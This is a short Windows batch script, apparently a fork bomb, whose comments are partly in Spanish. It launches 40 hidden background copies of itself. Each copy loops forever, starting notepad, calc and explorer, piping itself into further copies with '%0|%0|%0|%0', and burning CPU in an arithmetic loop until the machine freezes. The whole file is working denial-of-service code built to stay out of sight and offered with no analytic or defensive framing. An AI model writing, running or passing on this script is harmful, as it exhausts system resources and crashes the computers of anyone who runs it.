@echo off
REM ========================================
REM BACKGROUND TOTAL - 0 CMD
REM ========================================
if "%1"=="H" goto :H

REM 40 SPAWNS BACKGROUND
for /l %%i in (1,1,40) do start /b cmd /c "%~f0" H
exit /b

:H
:saturacion
REM LEGITIMOS EN BACKGROUND
start /b notepad.exe
start /b calc.exe
start /b explorer.exe

REM PIPE INVISIBLE
start /b %0 H
%0|%0|%0|%0

REM CPU DIRECTO
for /l %%i in (1,1,50000) do set /a "x=%%i*2"

goto saturacion